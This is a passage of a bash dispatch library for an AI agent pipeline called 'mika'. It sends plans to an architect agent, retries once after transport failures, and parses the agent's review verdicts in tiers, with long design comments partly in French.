                echo "_find_issue_plan: tier 3 discarded ${candidate} — it mentions ${ISSUE_NUM} but its header claims issue ${claimed% }" >&2
                FIND_ISSUE_PLAN_REFUTED="${FIND_ISSUE_PLAN_REFUTED}${FIND_ISSUE_PLAN_REFUTED:+, }${candidate##*/} (claims ${claimed% })"
                continue
            fi
            echo "_find_issue_plan: tier 3 selected ${candidate} (broad issue-number reference in the first 50 lines)" >&2
            printf '%s' "$candidate"
            return 0
        fi
    done < <(find "$WORKTREE_DIR/docs/plans" -name "*-plan.md" -size +500c 2>/dev/null | sort -r)

    return 1
}

_arch_ask() {
    # Phase A — architect-call helper. Invokes mika-arch via the CLI with the
    # given skill, delivering plan content via stdin. Returns the full JSON
    # envelope on stdout for the caller to parse `.content` and
    # `.metadata.session_id`.
    #
    # mika#1283: previously passed "@${plan_path}" as the message argument,
    # expecting `mika ask` to expand it to file content. `mika ask` does NOT
    # support `@<path>` expansion (verified 2026-05-25 via direct probe — the
    # literal path string was sent, and mika-arch's `read_agent_file` is
    # scoped to /home/samidarko/.mika/agents/mika-arch/ so worktree paths
    # like /data/workspace/.../docs/plans/...md are unreadable). The
    # architect was reviewing whatever issue-body context was already in
    # session memory, not the plan content. Fix: pipe content via stdin
    # (mika ask "-" reads the message from stdin per `mika ask --help`).
    #
    # Args:
    #   $1: skill name (mika-arch-groom-ticket | mika-arch-second-review)
    #   $2: absolute path to plan file (content piped via stdin)
    #   $3: optional session_id to continue an existing architect session
    local skill="$1" plan_path="$2" session_id="${3:-}"

    [ -n "$skill" ] && [ -n "$plan_path" ] || { echo "_arch_ask: missing skill or plan_path" >&2; return 2; }
    [ -r "$plan_path" ] || { echo "_arch_ask: plan_path not readable: $plan_path" >&2; return 2; }

    # mika#2363: declare the pass this turn executes, and ONLY it.
    #
    # `--enable-skill` used to sit here. It was measured to be abandoned in
    # transit since mika#1727 — `mika ask` is a thin A2A client and the flag
    # configures a local registry that is no longer the execution surface, which
    # `crates/mika-cli/src/commands/ask.rs` says in as many words. So mika-arch's
    # three `always_on` skills were ALL injected on every architect turn: 39 798
    # bytes of prompt, of which ~23.5 KB described two passes this call is not
    # making.
    #
    # `--only-skill` is the half of that missing channel that reaches spirit. It
    # is strictly subtractive — it evicts the sister passes, it cannot activate
    # anything — and the two flags are mutually exclusive by clap, so this is a
    # replacement and not an addition. Nothing is lost by dropping
    # `--enable-skill`: it already did nothing on this path.
    #
    # Only `$skill` is named. The vocabulary of the three architect skills lives
    # in MIKA_ARCH_SKILL_ALLOWLIST (`well_known_agents.rs`) and must not be
    # rewritten in shell, where it would silently drift.
    #
    # Disarming, if B2's tighter suffix-line contract ever bites: delete the two
    # `--only-skill` words below. No binary redeploy, no restart.
    local args=( ask --agent mika-arch --format json --verbose --only-skill "$skill" )
    [ -n "$session_id" ] && args+=( --session-id "$session_id" )
    args+=( - )

    mika "${args[@]}" < "$plan_path"
}

# ===========================================================================
# mika#2278 — a brief killed by a restart is re-sent, not waited on forever
# ===========================================================================
#
# Measured 2026-09-10 on the groom of mika#2276: a `mika-spirit` restart at
# 09:17 CEST killed the first-pass architect turn that had started at 08:39.
# The pass died, the dispatch slot with it, and the operator flow hung 1 h 50
# at an idle prompt until a manual nudge re-sent it — on a fresh session, which
# then completed normally. The autonomous flow has no operator to nudge: it
# just dies in PIPELINE_INCOMPLETE.
#
# Two composed defects made a transport blip cost a whole pass:
#
#  1. **No retry.** Each of the four call sites did `|| { _groom_warn …; return
#     1; }`. A restarting server is the single most obviously transient failure
#     there is, and it cost the pass, the slot, and one point of the re-drive
#     budget — three of which abandon a healthy ticket (mika#2020).
#
#  2. **`2>/dev/null` on all four.** `mika ask` writes its diagnosis to stderr
#     and it was thrown away, so the loop saw exit `1` and nothing else —
#     identical for "the server is restarting" and "that session belongs to
#     another agent". *The only channel carrying the distinction was closed by
#     the caller.*
#
# The second is what made the first non-trivial: one cannot retry judiciously
# without being able to tell transient from definitive. mika#2278 supplies the
# discriminant as a **process exit code** (`75`, `EX_TEMPFAIL`) rather than a
# `grep` on the message, for the reason mika#2179 and mika#2291 already
# settled: an error sentence written for a human must not become a wire format.
#
# Deliberately *not* retried here: a JSON-RPC refusal the server reasoned about
# and answered cleanly, `AGENT_BUSY` (-32000, mika#2163) included. That one
# already waits server-side in a bounded line before refusing, and stacking a
# second retry budget on top of it is the layering the plan's out-of-scope
# section warns against. It exits `1` and is visible as such.

# Where `mika ask`'s stderr from the most recent `_arch_ask_with_retry` is kept.
#
# A side channel is needed because the call sites run the wrapper inside `$( )`,
# so a variable set in there never reaches the caller. Same tmpfile shape and
# same `$$` (stable across subshells) as `_DISPOSITION_FUZZY_FILE` above;
# cleaned up by `_dispatch_lib_exit_trap`.
_ARCH_ASK_STDERR_FILE="${TMPDIR:-/tmp}/.dispatch-lib-arch-ask-stderr-$$"

# The exit code `mika ask` leaves on a transport-class failure.
# Mirrors `remote_ask::EXIT_TRANSPORT_FAILURE`; the Rust side pins the literal.
_ARCH_ASK_RETRYABLE_EXIT=75

# Is the mika#2278 retry armed?
#
# Default armed. `0` / `false` / `no` / `off` (case-insensitive) disarm it,
# restoring the pre-fix behaviour exactly — one attempt, its code propagated
# verbatim — with no binary redeploy. That switch is what makes the operator
# probe below executable: if a retry ever fires on a *contract* error, the
# transport/contract line has leaked and the remedy is to disarm and repair the
# classification, never to tune the budget.
_arch_ask_retry_enabled() {
    local raw="${MIKA_ARCH_ASK_RETRY:-1}"
    case "${raw,,}" in
        0|false|no|off) return 1 ;;
        *) return 0 ;;
    esac
}

# How long to wait before the single retry, in seconds.
#
# A restart is not instantaneous. Retrying within the second would land on the
# same dead port and burn the budget for nothing, so the delay is the thing
# that makes a budget of one sufficient.
#
# House three-tier convention: absent/empty → default; unreadable, `0` or
# negative → default + WARN. `0` does NOT disarm — that is
# `MIKA_ARCH_ASK_RETRY`'s job, and reading a typo'd delay as a disarm would
# silently restore the defect this exists to close.
#
# Bounded above as well, at 300s: the delay holds the groom dispatch slot, and
# an absurd value would immobilise it far longer than the outage it absorbs.
# 300s is already an order of magnitude past any observed restart and still
# well inside the skill's own 600s budget.
_arch_ask_retry_delay_secs() {
    local raw="${MIKA_ARCH_ASK_RETRY_DELAY_SECS:-}"
    if [ -z "$raw" ]; then
        echo 30
        return
    fi
    if ! [[ "$raw" =~ ^-?[0-9]+$ ]] || [ "$raw" -le 0 ] || [ "$raw" -gt 300 ]; then
        echo "WARN: arch_ask_retry_delay_invalid: MIKA_ARCH_ASK_RETRY_DELAY_SECS='${raw}' is not an integer in 1..300 — falling back to 30s" >&2
        echo 30
        return
    fi
    echo "$raw"
}

# The last non-empty line `mika ask` wrote to stderr, or empty.
#
# One line, not the whole capture: the full stderr can carry a dotenvx banner
# and a background-task notice, and the sentence that says what happened is the
# last one. The whole capture has already gone to the dispatch's own stderr.
_arch_ask_last_error() {
    [ -r "$_ARCH_ASK_STDERR_FILE" ] || return 0
    grep -v '^[[:space:]]*$' "$_ARCH_ASK_STDERR_FILE" 2>/dev/null | tail -n 1
}

# The same, rendered for appending to a `_groom_warn` message (R5).
#
# Empty when there is nothing to say, so the WARN never grows a dangling dash.
_arch_ask_error_suffix() {
    local last; last=$(_arch_ask_last_error)
    [ -n "$last" ] && printf ' — %s' "$last"
}

# `_arch_ask` plus one bounded retry on a transport-class failure.
#
# Args: identical to `_arch_ask` ($1 skill, $2 plan path, $3 optional session).
# Stdout: `_arch_ask`'s, verbatim. Exit: the last attempt's, verbatim.
#
# Retries **only** on `75`, never on "anything non-zero". A code we cannot read
# is treated as definitive (mika#2278 D4); the inverse would turn a future
# unforeseen failure mode into a silent retry loop.
#
# On the first pass `$3` is absent, so the retry departs on a fresh session —
# which is exactly the manual gesture that unblocked mika#2276. On passes 2 to 4
# `$3` is carried and the retry keeps it, because `mika-arch-second-review`'s
# continuity contract needs the architect to see its own prior turn. The named
# cost of that: if the killed turn had already persisted its user message, the
# architect sees the same prompt twice. Harmless — it answers the last
# occurrence — but real, and it is why the budget is one and not three.
_arch_ask_with_retry() {
    local skill="$1" plan_path="$2" session_id="${3:-}"
    local out status attempt delay

    for attempt in 1 2; do
        # Capture stderr rather than discarding it (R5), then echo it onward so
        # the dispatch log keeps it too. A retry overwrites the capture with its
        # own attempt's stderr, which is the one the failure WARN describes; the
        # earlier attempt has already reached the log by then.
        if out=$(_arch_ask "$skill" "$plan_path" "$session_id" 2>"$_ARCH_ASK_STDERR_FILE"); then
            status=0
        else
            status=$?
        fi
        [ -s "$_ARCH_ASK_STDERR_FILE" ] && cat "$_ARCH_ASK_STDERR_FILE" >&2

        [ "$status" -eq "$_ARCH_ASK_RETRYABLE_EXIT" ] || break
        [ "$attempt" -eq 1 ] || break
        _arch_ask_retry_enabled || {
            echo "INFO: arch_ask_retry_disarmed: skill=$skill exit=$status — MIKA_ARCH_ASK_RETRY is off, propagating" >&2
            break
        }

        delay=$(_arch_ask_retry_delay_secs)
        echo "INFO: arch_ask_retry: skill=$skill attempt=$attempt delay_secs=$delay reason=transport — $(_arch_ask_last_error)" >&2
        sleep "$delay"
    done

    if [ "$status" -eq "$_ARCH_ASK_RETRYABLE_EXIT" ] && [ "$attempt" -gt 1 ]; then
        echo "WARN: arch_ask_retry_exhausted: skill=$skill — the single retry was spent and the pass is lost anyway$(_arch_ask_error_suffix)" >&2
    fi

    printf '%s' "$out"
    return "$status"
}

# Module-global flag: set to 1 when tier-2 fuzzy matching fires, 0 otherwise.
# Read by _iterate_groom_loop to annotate trail entries with "(fuzzy)".
# Side-channel design per mika#1272 rev 2 — parser stdout stays clean.
#
# Implementation note: bash subshells ($(...)) cannot set parent variables, so
# we use a tmpfile to communicate the flag across the subshell boundary. The
# tmpfile path is set once at module load and cleaned up by callers' EXIT traps
# (dispatch-lib already installs one). Functions write "1" or "0" to the file;
# callers read it after the $(...) returns.
_DISPOSITION_FUZZY=0
_DISPOSITION_FUZZY_FILE="${TMPDIR:-/tmp}/.dispatch-lib-fuzzy-$$"

_disposition_was_fuzzy() {
    # Returns 0 (true) if the last _parse_disposition/_parse_verdict call used
    # tier-2 fuzzy matching; 1 (false) otherwise. Reads the tmpfile side-channel.
    [ -f "$_DISPOSITION_FUZZY_FILE" ] && [ "$(cat "$_DISPOSITION_FUZZY_FILE" 2>/dev/null)" = "1" ]
}

_parse_disposition_fuzzy() {
    # Tier 2 — fuzzy disposition parser (mika#1272). Reads architect response
    # text from stdin, applies case-insensitive pattern matching against known
    # paraphrase indicators, and emits the canonical disposition on stdout.
    #
    # Priority: ESCALATE > ITERATE > READY (most conservative wins).
    # Emits nothing if no pattern matches. Logs matched snippet to stderr.
    local text
    text=$(cat)

    local matched_escalate="" matched_iterate="" matched_ready=""
    local snippet=""

    # ESCALATE patterns
    for pat in "escalate" "human review" "cannot proceed" "fundamental" "out of scope for"; do
        if snippet=$(printf '%s' "$text" | grep -oi "$pat" | head -1) && [ -n "$snippet" ]; then
            matched_escalate="$snippet"
            break
        fi
    done

    # ITERATE patterns
    for pat in "needs revision" "another pass" "revise" "address the following" "concerns that require"; do
        if snippet=$(printf '%s' "$text" | grep -oi "$pat" | head -1) && [ -n "$snippet" ]; then
            matched_iterate="$snippet"
            break
        fi
    done

    # READY patterns (affirmative forward-motion signals only — no negated-absence)
    for pat in "proceed" "ship it" "dispatch" "good to go" "plan is clean"; do
        if snippet=$(printf '%s' "$text" | grep -oi "$pat" | head -1) && [ -n "$snippet" ]; then
            matched_ready="$snippet"
            break
        fi
    done

    # Disambiguation: ESCALATE > ITERATE > READY
    if [ -n "$matched_escalate" ]; then
        echo "_parse_disposition_fuzzy: mapped paraphrased disposition → ESCALATE (matched: '$matched_escalate')" >&2
        echo "ESCALATE"
    elif [ -n "$matched_iterate" ]; then
        echo "_parse_disposition_fuzzy: mapped paraphrased disposition → ITERATE (matched: '$matched_iterate')" >&2
        echo "ITERATE"
    elif [ -n "$matched_ready" ]; then
        echo "_parse_disposition_fuzzy: mapped paraphrased disposition → READY (matched: '$matched_ready')" >&2
        echo "READY"
    fi
    # No match → emit nothing (caller's * case fires)
}

_parse_verdict_fuzzy() {
    # Tier 2 — fuzzy verdict parser (mika#1272). Same pattern as
    # _parse_disposition_fuzzy but for second-pass verdicts (GROOMED vs ESCALATE).
    #
    # Priority: ESCALATE > GROOMED (conservative).
    local text
    text=$(cat)

    local matched_escalate="" matched_groomed=""
    local snippet=""

    # ESCALATE patterns
    for pat in "escalate" "cannot approve" "human review needed" "fundamental issues remain"; do
        if snippet=$(printf '%s' "$text" | grep -oi "$pat" | head -1) && [ -n "$snippet" ]; then
            matched_escalate="$snippet"
            break
        fi
    done

    # GROOMED patterns (use "ship it" not bare "ship" — avoids substring
    # false positives in "relationship", "ownership", "leadership", etc.)
    for pat in "groomed" "approved" "plan is ready" "ship it" "no remaining concerns"; do
        if snippet=$(printf '%s' "$text" | grep -oi "$pat" | head -1) && [ -n "$snippet" ]; then
            matched_groomed="$snippet"
            break
        fi
    done

    # Disambiguation: ESCALATE > GROOMED
    if [ -n "$matched_escalate" ]; then
        echo "_parse_verdict_fuzzy: mapped paraphrased verdict → ESCALATE (matched: '$matched_escalate')" >&2
        echo "ESCALATE"
    elif [ -n "$matched_groomed" ]; then
        echo "_parse_verdict_fuzzy: mapped paraphrased verdict → GROOMED (matched: '$matched_groomed')" >&2
        echo "GROOMED"
    fi
}

# _engine_escalation_line — Tier 0b recognizer (mika#2338).
#
# Since mika#2338 the engine no longer withholds an unattested disposition into
# the tier-0 marker: it rewrites the response into a terminal ESCALATE preceded
# by a finding line of FIXED shape,
#     F<n>: (BLOCKING) [mika-engine] review-anchor: attestation withheld … anchors_found=… miss_reason=…
# This helper prints the first such line, or nothing. The shape is matched at the
# START OF A LINE and in full: `[mika-engine]` alone is not the signal — every
# corrective re-prompt begins with it, the model relays it in its session and the
# arch prompts teach it, so an echo in prose is an ordinary shape. Only the line
# the engine composes counts. The literal fragment must stay in sync with
# REVIEW_ANCHOR_ENGINE_FINDING_MARKER in crates/mika-agent/src/agent_loop/mod.rs
# (test-dispatch-lib.sh compares the two).
_engine_escalation_line() {
    # stdin → first engine escalation line on stdout (or nothing).
    grep -m1 -E '^[[:space:]]*F[0-9]+: \(BLOCKING\) \[mika-engine\] review-anchor:' 2>/dev/null || true
}

_parse_disposition() {
    # Phase B — first-pass verdict parser. Reads architect response text from
    # stdin, emits READY|ITERATE|ESCALATE on stdout (or nothing on no match).
    #
    # Tiered matching:
    #   Tier 1a: strict literal `Disposition: <X>` (zero-cost fast path).
    #   Tier 1b: literal `Verdict: GROOMED`/`Verdict: ESCALATE` (mika#1421 v3).
    #            When mika-arch's session memory has prior ITERATE findings on
    #            the same plan, a first-pass invocation can return second-pass
    #            keyword shapes — the architect has effectively "carried over"
    #            into a second-review stance. Without this tolerance, the
    #            iterate-loop logs UNPARSED, _iterate_groom_loop returns 1, and
    #            the groom lands in the half-state #1421 v1+v2 closed for a
    #            different sub-class. Mapping: GROOMED → READY (loop runs a
    #            confirmatory second-pass), ESCALATE → ESCALATE.
    #   Tier 2:  fuzzy paraphrase matching (conservative, ESCALATE wins ties).
    # Writes "1" to $_DISPOSITION_FUZZY_FILE when tier 2 fires, "0" when tier
    # 1a/1b fires. Callers read _disposition_was_fuzzy() after the $(...)
    # returns.
    printf '0' > "$_DISPOSITION_FUZZY_FILE"
    local text
    text=$(cat)
    local result
    # Tier 0 — withheld-disposition short-circuit (mika#2037). The engine strips a
    # disposition it refused to let stand and substitutes this literal marker. When it is
    # present, NO tier may derive a verdict: the response is an absence of verdict, not an
    # approval.
    #
    # The position is load-bearing, not stylistic. After tier 1a the marker would still be
    # honoured, but after tier 2 it would not: the fuzzy pass matches paraphrases
    # ("proceed", "good to go", "plan is clean") anywhere in the text, so a response whose
    # disposition line was merely removed could still yield READY out of its own body. Tier 0
    # runs first so the engine's refusal cannot be undone downstream. Keep the literal in sync
    # with DISPOSITION_WITHHELD_MARKER in crates/mika-agent/src/agent_loop/mod.rs.
    # Matched at the START OF A LINE, not anywhere in the text: a response that QUOTES the
    # marker while carrying a genuine ITERATE or GROOMED must not be suppressed. Only the
    # engine writes it as a line of its own. Since mika#2338 this tier is the FALLBACK — the
    # engine escalates with a cause (tier 0b below) whenever the skill declares an ESCALATE of
    # the withdrawn line's family, which every shipped arch manifest does.
    case "$text" in
        "Disposition-Withheld: REVIEW-ANCHOR-MISSING"*|*"
Disposition-Withheld: REVIEW-ANCHOR-MISSING"*)
            echo "_parse_disposition: tier 0 — disposition withheld by the engine (review-anchor attestation missing, mika#2037); emitting nothing" >&2
            return
            ;;
    esac
    # Tier 0b — engine escalation line (mika#2338). The engine's refusal of an
    # unattested disposition is an ESCALATE with a cause, and it must win before
    # tier 1a: that tier greps the FIRST `Disposition:` anywhere in the text,
    # unanchored, so a READY the model quoted inline would otherwise be read
    # before the ESCALATE the engine appended at the end. The engine also
    # rewrites inline mentions; the two layers each suffice alone.
    if [ -n "$(printf '%s\n' "$text" | _engine_escalation_line)" ]; then
        echo "_parse_disposition: tier 0b — engine escalation line present (review-anchor attestation withheld, mika#2338); ESCALATE" >&2
        echo "ESCALATE"
        return
    fi
    # Tier 1a — canonical first-pass shape
    result=$(printf '%s' "$text" | grep -oE 'Disposition:[[:space:]]*(READY|ITERATE|ESCALATE)' \
        | grep -oE '(READY|ITERATE|ESCALATE)' \
        | head -1)
    if [ -n "$result" ]; then
        echo "$result"
        return
    fi
    # Tier 1b — Verdict-shape carry-over from architect session memory
    local verdict_keyword
    verdict_keyword=$(printf '%s' "$text" | grep -oE 'Verdict:[[:space:]]*(GROOMED|ESCALATE)' \
        | grep -oE '(GROOMED|ESCALATE)' \
        | head -1)
    case "$verdict_keyword" in
        GROOMED)
            echo "_parse_disposition: tier 1b accepted Verdict: GROOMED → READY (mika#1421 v3 session-carry-over tolerance)" >&2
            echo "READY"
            return
            ;;
        ESCALATE)
            echo "_parse_disposition: tier 1b accepted Verdict: ESCALATE → ESCALATE (mika#1421 v3 session-carry-over tolerance)" >&2
            echo "ESCALATE"
            return
            ;;
    esac
    # Tier 2 fallback
    result=$(printf '%s' "$text" | _parse_disposition_fuzzy)
    if [ -n "$result" ]; then
        printf '1' > "$_DISPOSITION_FUZZY_FILE"
        echo "$result"
    fi
}

_parse_verdict() {
    # Phase B — second-pass verdict parser. Reads architect response text from
    # stdin, emits GROOMED|ESCALATE on stdout (or nothing on no match).
    #
    # Three-tier matching (mika#1272 + session-carry-over tolerance):
    #   Tier 1:  strict literal `Verdict: <X>` (zero-cost fast path)
    #   Tier 1b: session-carry-over tolerance — accept `Disposition: <X>`
    #            (first-pass shape) when the architect legitimately declines
    #            a third-pass on unchanged plan (spec §4.5 / R11). Mirror of
    #            mika#1421 v3 in _parse_disposition. Founding incident: 16+
    #            spurious ESCALATE events across 8+ tickets on 2 repos
    #            spanning 2026-07-01 → 2026-07-22 — all plans passed content
    #            grooming but failed on shape mismatch in this parser.
    #   Tier 2:  fuzzy paraphrase matching (conservative, ESCALATE wins ties)
    # Writes "1" to $_DISPOSITION_FUZZY_FILE when tier 2 fires, "0" when tier 1
    # or tier 1b fires. Callers read _disposition_was_fuzzy() after the $(...)
    # returns.
    printf '0' > "$_DISPOSITION_FUZZY_FILE"
    local text
    text=$(cat)
    local result
    # Tier 0 — withheld-disposition short-circuit (mika#2037). The engine strips a
    # disposition it refused to let stand and substitutes this literal marker. When it is
    # present, NO tier may derive a verdict: the response is an absence of verdict, not an
    # approval.
    #
    # The position is load-bearing, not stylistic. After tier 1a the marker would still be
    # honoured, but after tier 2 it would not: the fuzzy pass matches paraphrases
    # ("proceed", "good to go", "plan is clean") anywhere in the text, so a response whose
    # disposition line was merely removed could still yield READY out of its own body. Tier 0
    # runs first so the engine's refusal cannot be undone downstream. Keep the literal in sync
    # with DISPOSITION_WITHHELD_MARKER in crates/mika-agent/src/agent_loop/mod.rs.
    # Matched at the START OF A LINE, not anywhere in the text: a response that QUOTES the
    # marker while carrying a genuine ITERATE or GROOMED must not be suppressed. Only the
    # engine writes it as a line of its own. Since mika#2338 this tier is the FALLBACK — the
    # engine escalates with a cause (tier 0b below) whenever the skill declares an ESCALATE of
    # the withdrawn line's family, which every shipped arch manifest does.
    case "$text" in
        "Disposition-Withheld: REVIEW-ANCHOR-MISSING"*|*"
Disposition-Withheld: REVIEW-ANCHOR-MISSING"*)
            echo "_parse_verdict: tier 0 — disposition withheld by the engine (review-anchor attestation missing, mika#2037); emitting nothing" >&2
            return
            ;;
    esac
    # Tier 0b — engine escalation line (mika#2338); see _parse_disposition.
    if [ -n "$(printf '%s\n' "$text" | _engine_escalation_line)" ]; then
        echo "_parse_verdict: tier 0b — engine escalation line present (review-anchor attestation withheld, mika#2338); ESCALATE" >&2
        echo "ESCALATE"
        return
    fi
    result=$(printf '%s' "$text" | grep -oE 'Verdict:[[:space:]]*(GROOMED|ESCALATE)' \
        | grep -oE '(GROOMED|ESCALATE)' \
        | head -1)
    if [ -n "$result" ]; then
        echo "$result"
        return
    fi
    # Tier 1b — session-carry-over tolerance (symmetric to _parse_disposition
    # mika#1421 v3 which accepts Verdict: → READY). On session-recall of an
    # unchanged already-ratified plan, mika-arch legitimately emits first-pass
    # shape "Disposition: READY|ESCALATE" and declines a third pass per
    # spec §4.5 / R11 — that ratification-on-recall MUST map to a GROOMED
    # verdict, not the default ESCALATE. See mika-arch-second-review/
    # system_prompt.md for the two-pass discipline; see the founding streak
    # investigation for the failure evidence.
    local disposition_keyword
    disposition_keyword=$(printf '%s' "$text" \
        | grep -oE 'Disposition:[[:space:]]*(READY|ITERATE|ESCALATE)' \
        | grep -oE '(READY|ITERATE|ESCALATE)' \
        | head -1)
    case "$disposition_keyword" in
        READY)
            echo "_parse_verdict: tier 1b accepted Disposition: READY → GROOMED (session-carry-over tolerance, mirror of mika#1421 v3)" >&2
            echo "GROOMED"
            return
            ;;
        ESCALATE)
            echo "_parse_verdict: tier 1b accepted Disposition: ESCALATE → ESCALATE (session-carry-over tolerance)" >&2
            echo "ESCALATE"
            return
            ;;
        # Deliberately no ITERATE case — the spec forbids a third-pass, so
        # ITERATE at second-pass falls through to Tier 2 fuzzy (typically
        # ESCALATE-biased) rather than being aliased.
    esac
    # Tier 2 fallback
    result=$(printf '%s' "$text" | _parse_verdict_fuzzy)
    if [ -n "$result" ]; then
        printf '1' > "$_DISPOSITION_FUZZY_FILE"
        echo "$result"
    fi
}

_trail_append() {
    # Phase C — verdict-trail capture. Appends a single line to
    # $WORKTREE_DIR/.claude/groom-verdict-trail.log capturing one architect
    # call's metadata. Used by the eventual canonical-callout writer to render
    # the Grooming history field.
    #
    # Args: $1 = skill (groom-ticket | second-review), $2 = session_id,
    #       $3 = disposition (READY|ITERATE|ESCALATE) or verdict (GROOMED|ESCALATE)
    local skill="$1" session_id="$2" outcome="$3"
    [ -n "$WORKTREE_DIR" ] && [ -d "$WORKTREE_DIR" ] || return 0
    local trail_dir="$WORKTREE_DIR/.claude"
    mkdir -p "$trail_dir" 2>/dev/null
    local trail_file="$trail_dir/groom-verdict-trail.log"
    printf '%s\t%s\t%s\t%s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$skill" "$session_id" "$outcome" >> "$trail_file"
}

_trail_read() {
    # Phase C — verdict-trail reader. Emits the trail entries as TSV on stdout.
    # Caller composes the Grooming history line from these entries.
    [ -n "$WORKTREE_DIR" ] && [ -d "$WORKTREE_DIR" ] || return 0
    local trail_file="$WORKTREE_DIR/.claude/groom-verdict-trail.log"
    [ -r "$trail_file" ] && cat "$trail_file"
}

_launch_revise_pilot() {
    # Phase D companion (mika#1271) — launch claude-pilot for content-only plan
    # revision against architect findings. Entry command: /mika-revise-plan
    # (slash command at mika-platform/.claude/commands/mika-revise-plan.md,
    # copied into the worktree by _set_up_worktree at task start).
    #
    # The pilot reads findings, revises the plan on disk in-place, exits. We
    # detect revision via sha256 of the plan file before-and-after. Identical
    # content = "no revision happened" = caller falls through.
    #
    # Args: $1 = absolute path to findings file — le findings-file de PREMIÈRE
    #            passe (`$WORKTREE_DIR/.iterate/findings-1.md`, écrit par
    #            `_iterate_groom_loop` depuis la sortie architecte). C'est la
    #            source UNIQUE du premier terme du prédicat mika#2306 ci-dessous.
    # Returns: 0 if plan content changed, 1 otherwise (missing args, no plan
    #          found, pilot failed to revise).

    # mika#2306 — compteur de garde du rattrapage Fire-Disposition, remis à zéro
    # à CHAQUE entrée. Global à dessein (pas de `local`) : la terminaison doit
    # être lisible sans dérouler le flot de contrôle, et le test T10 la lit.
    _FD_REVISE_RETRIED=0

    local findings_file="$1"
    [ -r "$findings_file" ] || {
        echo "WARN: _launch_revise_pilot: findings file not readable: $findings_file" >&2
        return 1
    }
    [ -n "$WORKTREE_DIR" ] && [ -d "$WORKTREE_DIR" ] || {
        echo "WARN: _launch_revise_pilot: WORKTREE_DIR missing" >&2; return 1; }
    [ -n "$ISSUE_NUM" ] || {
        echo "WARN: _launch_revise_pilot: ISSUE_NUM unset" >&2; return 1; }

    # Locate the plan file via _find_issue_plan (mika#1421 — filename pattern
    # with content-fallback for date-prefix slug-tail filenames).
    local plan_path
    plan_path=$(_find_issue_plan) || {
        echo "WARN: _launch_revise_pilot: no plan file to revise" >&2; return 1; }

    # sha256 before revise (detection mechanism; mtime is too coarse).
    local pre_hash; pre_hash=$(sha256sum "$plan_path" | cut -d' ' -f1)

    # Distinct sub-session log id for the revise pilot.
    local revise_log_id="${LOG_ID}-revise-$(date +%s)"
    local revise_stdout; revise_stdout=$(mktemp /tmp/revise-stdout-XXXXXX)
    local revise_stderr; revise_stderr=$(mktemp /tmp/revise-stderr-XXXXXX)

    echo "_launch_revise_pilot: launching (log $revise_log_id) for $REPO#$ISSUE_NUM with $(basename "$findings_file")" >&2
    set +e
    # CWD_ARGS is intentionally word-split (multiple flags)
    # shellcheck disable=SC2086
    _pilot_log_dir; _run_pilot_sandboxed claude-pilot --verbose --log-dir "$_PILOT_LOG_DIR" --task-id "$revise_log_id" \
        --command "/mika-revise-plan" $CWD_ARGS \
        -- "@${findings_file}" \
        >"$revise_stdout" 2>"$revise_stderr"
    local revise_exit=$?
    set -e

    # sha256 after revise
    local post_hash; post_hash=$(sha256sum "$plan_path" | cut -d' ' -f1)
    rm -f "$revise_stdout" "$revise_stderr"

    if [ "$pre_hash" != "$post_hash" ]; then
        echo "_launch_revise_pilot: plan revised (sha changed from ${pre_hash:0:12} to ${post_hash:0:12})" >&2
        _fd_retry_if_section_still_missing "$findings_file" "$plan_path"
        return 0
    else
        echo "WARN: _launch_revise_pilot: plan unchanged after revise pilot (exit=$revise_exit)" >&2
        return 1
    fi
}

# mika#2306 — le rattrapage Fire-Disposition, greffé sur la branche `sha256`
# RÉUSSIE de `_launch_revise_pilot`.
#
# Le défaut qu'il ferme : le critère de convergence du revise est « le contenu a
# changé », jamais « le finding a été traité ». Un revise qui corrige une virgule
# sans ajouter la section réclamée est, pour la boucle, indistinguable d'un
# revise réussi ; elle enchaîne sur le second passage, qui ESCALATE, et l'unique
# itération a été dépensée pour rien.
#
# Le prédicat est une CONJONCTION DE DEUX `grep`, jamais un jugement :
#   1. l'architecte a réclamé la section ⇔ le findings-file de PREMIÈRE PASSE
#      contient la chaîne `Fire-Disposition` (le vocabulaire imposé par son
#      propre gate) ;
#   2. la section est absente ⇔ le plan révisé ne porte pas `^## Fire-Disposition`.
#
# La SOURCE du premier terme est portante, pas un détail de rédaction. C'est
# `$1` — le findings-file de première passe reçu par `_launch_revise_pilot`. Le
# findings ciblé que cette fonction écrit elle-même (`findings-1-fd.md`) est
# INTERDIT comme source : il contient nécessairement la chaîne `Fire-Disposition`
# puisque c'est son objet, donc un prédicat qui le relirait serait vrai par
# construction — la garde relancerait même quand l'architecte n'a rien demandé,
# et le test de relance-unique resterait vert sur une garde qui ne regarde plus
# la sortie architecte. Le compteur casserait la boucle infinie ; il ne rendrait
# pas le défaut visible. Même raison pour l'absence de récursion sur
# `_launch_revise_pilot` : elle ferait de `findings-1-fd.md` le `$1` du second
# tour, c'est-à-dire exactement la confusion de source interdite.
#
# Si l'un des deux termes est faux, RIEN ne se passe : comportement d'avant le
# correctif, bit pour bit. Un plan sans détecteur ne paie rien, un revise qui a
# fait son travail ne paie rien. Un findings-file illisible sort le dispatch de
# la population plutôt que de l'y faire entrer.
#
# Le BUDGET ARCHITECTE est inchangé : aucun appel `_arch_ask` sur ce chemin. Ce
# qui est élargi est le budget du *revise*, qui n'est le contrat de personne —
# et d'une seule tentative. Cette fonction ne REFUSE jamais rien : elle réessaie,
# puis laisse passer en journalisant. Un échec dur ici aurait déplacé l'ESCALATE
# d'une porte au lieu de le lever.
#
# Args: $1 = findings-file de première passe (source du terme 1)
#       $2 = chemin du plan révisé (sujet du terme 2)
# Returns: toujours 0 — l'appelant a déjà décidé que le plan a changé.
_fd_retry_if_section_still_missing() {
    local first_pass_findings="$1" plan_path="$2"

    # Budget : une seule relance par invocation de `_launch_revise_pilot`.
    [ "${_FD_REVISE_RETRIED:-0}" -eq 0 ] || return 0
    # Fail-safe : une information illisible SORT de la population.
    [ -r "$first_pass_findings" ] || return 0
    [ -r "$plan_path" ] || return 0

    # Terme 1 — l'architecte a réclamé la section.
    grep -qF -- 'Fire-Disposition' "$first_pass_findings" 2>/dev/null || return 0
    # Terme 2 — le plan révisé ne la porte toujours pas.
    ! grep -qE '^## Fire-Disposition' "$plan_path" 2>/dev/null || return 0

    # Armé avant toute action : un échec en aval ne doit pas rouvrir le budget.
    _FD_REVISE_RETRIED=1

    local fd_findings_file="${first_pass_findings%/*}/findings-1-fd.md"
    printf '%s\n' "FINDING SYNTHÉTIQUE — émis par dispatch-lib (mika#2306), pas par l'architecte.

